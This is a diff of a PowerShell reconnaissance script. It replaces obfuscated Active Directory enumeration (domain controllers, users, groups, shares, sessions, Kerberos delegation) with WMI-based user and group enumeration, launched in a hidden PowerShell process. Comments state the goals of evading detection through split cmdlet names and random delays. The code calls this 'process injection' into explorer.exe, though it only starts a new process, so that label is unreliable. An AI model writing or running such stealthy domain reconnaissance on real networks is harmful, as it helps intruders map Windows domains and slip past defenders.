@@ -1,57 +1,37 @@
-# Aliases for common cmdlets
-$GetWmiObject = "GWMI"   # Alias for Get-WmiObject
-$GetADUser = "G" + "e" + "t-" + "A" + "D" + "User"  # Obfuscation of Get-ADUser cmdlet
-$GetADGroup = "G" + "e" + "t-" + "A" + "D" + "Group"  # Obfuscation of Get-ADGroup cmdlet
+# Function to inject into explorer.exe
+function Invoke-ProcessInjection {
+    $explorerPID = (Get-Process explorer | Select-Object -First 1).Id
+    $code = {
+        # Obfuscation for WMI query (avoiding net.exe or dsquery.exe usage)
+        $domain = ([wmiclass]"\\.\root\cimv2:Win32_ComputerSystem").Domain
+        $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
-# Obfuscating Domain and Current User
-$domain = ($($GetWmiObject -Class Win32_ComputerSystem)).Domain
-$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        # Obfuscated enumeration for domain users and groups
+        $users = "Select * From Win32_UserAccount Where Domain='$domain'"
+        $usersEnum = ([WmiClass]"\\.\root\cimv2:Win32_UserAccount").ExecQuery($users)
 
-# Random Sleep to simulate legit activity
-Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 20)
+        # Enumerating groups without Get-ADGroup
+        $groups = "Select * From Win32_Group Where Domain='$domain'"
+        $groupsEnum = ([WmiClass]"\\.\root\cimv2:Win32_Group").ExecQuery($groups)
 
-# Enumerating Domain Controllers (obfuscated Get-ADDomainController)
-Write-Host ("En" + "um" + "e" + "rating Domain Controllers...")
-$gADC = G + 'e' + "t" + "-" + "A" + "D" + "D" + "omain" + "Controller"
-& $gADC -Filter * | ForEach-Object {
-    $_.HostName
+        # Delay execution to avoid detection from burst activity
+        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
+
+        # Output results
+        $usersEnum | ForEach-Object { $_.Name }
+        $groupsEnum | ForEach-Object { $_.Name }
+    }
+
+    # Inject the code into explorer.exe
+    Start-Process -FilePath powershell.exe -ArgumentList "-nop -w hidden -c $code" -PassThru -NoNewWindow
 }
 
-# Random sleep to slow down execution
-Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
+# Obfuscation technique: breaking up common commandlets
+$GetWmiObject = "GWMI"
+$StartProcess = "S" + "t" + "a" + "r" + "t-" + "Pr" + "ocess"
 
-# Enumerating all Users (obfuscated Get-ADUser)
-Write-Host ("En" + "um" + "e" + "rating Users...")
-& $GetADUser -Filter * -Property DisplayName, SamAccountName, Enabled | Select-Object DisplayName, SamAccountName, Enabled
+# Random delay to evade detection
+Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 20)
 
-# Sleeping to avoid overuse of system resources
-Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
-
-# Enumerating all Groups (obfuscated Get-ADGroup)
-Write-Host ("En" + "um" + "e" + "rating Groups...")
-& $GetADGroup -Filter * | Select-Object Name
-
-# Obfuscating Trust Relationship Enumeration
-Write-Host ("C" + "he" + "cking Trust Relationships...")
-(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
-
-# Obfuscate Shares Enumeration
-Write-Host ("En" + "um" + "e" + "rating network shares...")
-$shares = & $GetWmiObject -Class Win32_Share | Select-Object Name, Path
-$shares | ForEach-Object {
-    Write-Host $_.Name, $_.Path
-}
-
-# Stealthy enumeration of current sessions (obfuscated Get-WmiObject)
-Write-Host ("En" + "um" + "e" + "rating Active Sessions...")
-$logonSessions = & $GetWmiObject -Class Win32_LogonSession
-$logonSessions | ForEach-Object {
-    Write-Host $_.LogonId, $_.StartTime
-}
-
-# Obfuscate Kerberos Delegation Enumeration
-Write-Host ("C" + "he" + "cking Kerberos Delegation...")
-$delegatedUsers = & $GetADUser -Filter {TrustedForDelegation -eq $true} -Property SamAccountName
-$delegatedUsers | ForEach-Object {
-    Write-Host $_.SamAccountName
-}
+# Inject into trusted explorer.exe and execute the enumeration
+Invoke-ProcessInjection
